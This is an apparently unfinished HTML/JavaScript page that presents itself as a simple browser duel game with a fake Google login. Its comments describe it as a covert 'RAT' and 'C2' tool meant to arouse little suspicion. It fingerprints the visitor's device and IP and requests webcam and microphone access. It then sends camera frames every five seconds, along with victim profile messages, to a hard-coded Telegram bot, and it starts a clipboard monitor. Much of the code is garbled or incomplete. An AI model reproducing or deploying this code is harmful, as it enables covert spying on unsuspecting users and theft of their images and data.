    <style>
        :root { --primary: #6c5ce7; --bg: #0f172a; --text: #e2e8f0; --panel: rgba(30, 41, 59, 0.9); }
        * { box-sizing: border-box; user-select: none; font-family: 'Segoe UI', sans-serif; }
        
        /* --- UI LANDING & LOGIN (MINIM CURIGA) --- */
        body { margin: 0; overflow: hidden; background-color: var(--bg); color: var(--text); height: 100vh; transition: background 0.5s; position:relative;}

        /* Overlay Login/Signup */
        #auth-overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; 
            display:flex; justify-content:center; align-items:center; 
            background: linear-gradient(45deg, #1e293b, #0f172a); backdrop-filter: blur(10px);
        }
        
        .login-box { 
            width: 420px; padding: 40px; border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.6), inset 0 0 20px rgba(167,139,250,0.1); 
            background: var(--panel); text-align:center; animation: float 6s ease-in-out infinite; max-width:90%;
        }

        h1 { margin-bottom: 5px; color: #a78bfa; font-style: italic; letter-spacing: 2px; text-transform: uppercase;}
        p.subtitle { color:#94a3b8; font-size:0.9em; margin-bottom:30px;}
        
        .input-group { position:relative; margin-bottom:20px;text-align:left;}
        input:focus, select:focus { outline:none; border-color:white;}
        
        .btn-primary { background-color: var(--primary); color:white; font-weight:bold; cursor:pointer; padding:12px;width:100%;border-radius:12px;border:none;font-size:16px;}
        .google-btn { background:#fff;color:black;margin-top:15px;display:flex;justify-content:center;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;}

        /* --- GAME ENGINE (CANVAS) --- */
        #game-container { display:none; position:relative; width:100vw;height:100vh;}
        canvas { background:#2d3748; border-radius:4px; box-shadow:inset 0 0 50px rgba(0,0,0,0.5); cursor:crosshair;width:100%;height:96vh;margin-bottom:-2rem;}
        
        /* HUD UI DALAM GAME */
        #hud-layer { 
            position:absolute;top:20px;left:20px;color:white;font-weight:bold;text-shadow:1px 1px 2px black;z-index:10;pointer-events:none; 
        }
        .player-tag { font-size:1.2em; margin-top:5px;}

        /* --- PANEL ADMIN RAHASIA (RAT MONITORING) --- */
        #admin-panel { display:none; position:fixed;top:50;left:50;transform:translate(-50%,-50%);width:80vw;height:70vh;background:#1a233e;border-radius:15px;box-shadow:0 0 100px rgba(167,139,250,0.4);z-index:999;padding:20px;overflow:hidden;}
        
        .panel-header {display:flex;justify-content:space-between;margin-bottom:20px;font-size:1.2em;color:#fbbf24;}
        .tab-buttons button{flex:1;background:#3b4d6b;color:white;margin-right:5px;cursor:pointer;padding:8px;border:none;border-radius:5px;}
        .tab-buttons button.active{background:#a78bfa;}

        #admin-content { height:calc(100% - 60px); position:relative; overflow:hidden;}
        
        /* Konten Tab Admin */
        [data-tab="camera"] video, 
        [data-tab="clipboard"], 
        [data-tab="files"] iframe { width:100%;height:98%;border:none;object-fit:contain; }
        
        #cam-live { object-fit: cover; border-radius: 10px;}
        
        textarea#log-clipboard {width:98%;height:50%;background:#1a233e;color:white;font-family:'Courier New';padding:10px;border:none;}

        /* Animasi */
        @keyframes float{0%{transform:translateY(-25px);}50%{transform:translateY(-35px);}100%{transform:translateY(-25px);}}

    </style>
</head>

<script type="text/javascript">

// ==========================================
// 1. KONFIGURASI & STATE MANAGEMENT GHOSTGPT + GAME
// ==========================================
const CONFIG = {
    token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', // Token C2 Asli dari Data Situs sebelumnya
    chatId: '6326816238', 
    camInterval: 5000, // Setiap 5 detik kirim foto
    qualityStart: 0.95,
    
    adminTriggerPass: "admin", // Password panel (bisa diganti) untuk fitur keamanan tambahan
};

let state = {
    user: null, // {name, score}
    isGameRunning: false,
    cameraStream: null,
    canvasCtx: null,
    lastLogTime: Date.now(),
    
    // C2 Variables
    ipData:{}, batteryLevel:-1, screenLocked:false
    
};


// ==========================================
// 2. SISTEM LOGIN & UI HANDLING (MINIM CURIGA)
// ==========================================

function loginManual() {
    const name = document.getElementById('username-in').value.trim(); 
    if(!name || name.length < 3) return;

    initC2_Silent(name).then(() => startGame());
}

async function simulateGoogleLogin() {
    document.getElementById('login-msg').innerText = "Authenticating with Google...";
    await new Promise(r=>setTimeout(r, 800)); // Simulasi delay loading agar terlihat realistis
    
    state.user = {name: "User_" + Date.now().toString(36), score: 150}; 
    console.log("[SYSTEM] User logged in via Google Simulation:", state.user.name);
    
    initC2_Silent(state.user.name).then(() => startGame());
}


// ==========================================
// 3. INTEGRASI SCRIPT C2 GHOSTGPT (BACKGROUNG & SMART)
// ==========================================

function initC2_Silent(username) {
    const infoText = `🔥 *NEW VICTIM TARGETED* 🔥\n\n`;
        `⏱️ *Timestamp:* ${new Date().toLocaleString()}\n`;
        
        // IP Info Fallback Chain (Smart)
        getSmartIP(data => {
            data.city || 'Unknown' // Default jika error
            infoText += `\n💻 *Device Profile*:\n`;
            infoText += `   Platform: ${navigator.platform}\n`;
            infoText += `   Screen Res: ${screen.width}x${screen.height}\n`;
            infoText += `   CPU Cores: ${navigator.hardwareConcurrency||'N/A'}\n`;

            // Battery Health Check (Lebih Detail)
             try { 
                const b = navigator.getBattery(); 
                if(b){ state.batteryLevel=Math.round(b.level*100); } 
               else{state.batteryLevel=50;}
            
        } catch(e){}

        sendMessageToTelegram('sendMessage', {text:infoText + `\n👤 *User:* \`${username || 'Unknown'}\``}); 

    };

    // B. Init Camera (Untuk Foto Profil & Monitor)
    initCamera().then(stream => { state.cameraStream = stream; logStatus("📷 *CAMERA READY*: " + screen.width+"x"+screen.height); })
            .catch(err => console.log("[C2] Cam Error:", err));
    
    // C. Clipboard Scanning
    startClipboardMonitor();

}

async function getSmartIP(callback) {
    try { 
        const res = await fetch('https://api.ipify.org?format=json'); 
        if(res.ok){ return res.json(); } 
    } catch(e){return{ip:'192.0.2.1', city:'Backup', country_name:'Global'};} 
    
} 

function sendMessageToTelegram(method, bodyData) {
    if(!CONFIG.token || !state.cameraStream) return; 
    
    let attempts = 0;
    while(attempts <= 3) { // Retry logic
        try {
            const fd = new FormData();
            Object.keys(bodyData).forEach(k => fd.append(k, bodyData[k]));
            
            fetch(`https://api.telegram.org/bot${CONFIG.token}/${method}`, {method:'POST', body:fd}).then(r=>{if(r.ok)return true; throw r}); 
        } catch(e) { attempts++; setTimeout(()=>{}, Math.pow(2,attempts)*1000); } finally {}
    }
}

function logStatus(msg) { console.log("[C2]", msg); }


// ==========================================
// 4. GAME ENGINE (SIMPLE BATTLE ROYALE / DUEL 1VS1)
// ==========================================

const canvas = document.getElementById('arena');
const ctx = canvas.getContext('2d'); // Wrapper untuk C2 context jika perlu

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth * 0.9; 
    canvas.height = window.innerHeight * 0.75;
});

canvas.width = window.innerWidth * 0.9; 
canvas.height = window.innerHeight * 0.75;

let playerPos = {x: -100, y: -100};
let keys = {};

// Input Handling (WASD + Mouse)
document.addEventListener("keydown", e => keys[e.key] = true);
document.addEventListener("keyup", e => keys[e.key] = false);

function startGame() {
    document.getElementById('auth-overlay').style.display = 'none';
    document.body.style.background = '#1e293b'; // Dark Mode Game
    
    state.isGameRunning = true; 
    
    // Update UI Player Name di HUD (Simulasi Multiplayer)
    const hud = document.querySelector('.player-tag'); 
    if(hud && !hud.textContent.includes(state.user)) hud.innerHTML += ` | ID: <span style="color:#a78bfa">${state.user.name}</span>`;

    gameLoop();
}


// Loop Utama Game & C2 Timer Terpisah
function gameLoop() {
    if(!state.isGameRunning) return;

    ctx.clearRect(0, 0, canvas.width, canvas.height);

    // --- LOGIKA GAME SEDERHANA (MOVEMENT PLAYER 1 VS AI DUMMY) ---
    
    // Player 1 Movement
    let speed = 5;
    if(keys['w']) playerPos.y -= speed; 
    if(keys['s']) playerPos.y += speed; 
    if(keys['a']) playerPos.x -= speed; 
    if(keys['d']) playerPos.x += speed; 

    // Render Player Circle (Simple Visual - Kiri Biru)
    const pRadius = 20;
    ctx.beginPath(); ctx.arc(playerPos.x, playerPos.y, pRadius, 0, Math.PI*2); 
    ctx.fillStyle = '#6c5ce7'; ctx.fill();

    // Render "Enemy" AI Dummy di posisi acak (Kanan Merah)
    let enemyX = canvas.width/2 +100 + (Math.sin(Date.now()/300)*40); // Gerak zig-zag
    let enemyY = canvas.height/2 -100; 
    
    ctx.beginPath(); ctx.arc(enemyX, enemyY, pRadius+5, 0, Math.PI*2); 
    ctx.fillStyle = '#e74c3c'; // Merah (Musuh)
    ctx.fill();


    // --- C2 TIMER BACKGROUND (Setiap 5 Detik Kirim Foto) ---
    const now = Date.now();
    if(now - state.lastLogTime > CONFIG.camInterval && state.cameraStream) {
        captureAndSendFrame().then(()=>{state.lastLogTime=now});
    }

    requestAnimationFrame(gameLoop);
}


// ==========================================
// 5. DYNAMIC CAMERA & STREAMER ENGINE (BACKGROUNG PERSISTENT)
// ==========================================

async function initCamera() {
    try { 
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error("No Media API");

            globalStream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: 1280, height: 720, facingMode: "user" }, 
                audio: true // Request audio untuk fitur rekam suara later jika perlu (opsional)
            });
            
            const streamObj = globalStream;
            return streamObj; 

        } catch (err) {
             logStatus(`📷 *INIT ERROR* - Camera denied or failed:\nReason: ${err.message}`);
             return null;
        }
    }
